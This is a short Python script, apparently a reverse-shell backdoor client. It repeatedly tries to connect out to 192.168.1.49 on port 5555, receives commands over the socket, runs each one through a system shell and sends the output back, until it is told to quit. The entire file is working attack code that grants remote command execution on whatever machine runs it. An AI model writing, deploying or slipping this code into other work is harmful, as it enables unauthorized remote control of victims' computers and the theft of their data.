import socket
import time
import json
import subprocess

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data += s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

def connection():
    while True:
        try:
            s.connect(("192.168.1.49", 5555))
            shell()
            break
        except:
            time.sleep(20)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
